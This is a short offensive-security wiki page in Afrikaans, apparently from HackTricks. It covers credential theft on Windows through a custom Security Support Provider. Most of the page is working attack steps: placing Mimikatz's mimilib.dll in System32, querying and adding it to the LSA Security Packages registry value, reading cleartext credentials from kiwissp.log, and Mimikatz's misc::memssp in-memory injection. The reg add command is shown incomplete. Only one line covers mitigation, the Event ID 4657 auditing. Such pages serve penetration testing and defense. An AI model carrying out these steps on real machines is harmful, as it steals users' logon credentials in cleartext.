# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Leer wat 'n SSP (Security Support Provider) hier is.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **in te vang** in **duidelike teks** die **akkrediteerings** wat gebruik word om toegang tot die masjien te verkry.

#### Mimilib

Jy kan die `mimilib.dll` binêre gebruik wat deur Mimikatz verskaf word. **Dit sal alle akkrediteerings in duidelike teks in 'n lêer log.**\
Laat die dll val in `C:\Windows\System32\`\
Kry 'n lys van bestaande LSA Veiligheid Pakkette:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Voeg `mimilib.dll` by die Veiligheidsondersteuningsverskafferlys (Veiligheidspakkette):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
En na 'n herlaai kan alle geloofsbriewe in duidelike teks gevind word in `C:\Windows\System32\kiwissp.log`

#### In geheue

Jy kan dit ook direk in geheue inspuit met Mimikatz (let op dat dit 'n bietjie onstabiel/nie werkend kan wees):
```powershell
privilege::debug
misc::memssp
```
Dit sal nie herlaai oorleef nie.

#### Versagting

Event ID 4657 - Oudit skepping/wijziging van `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
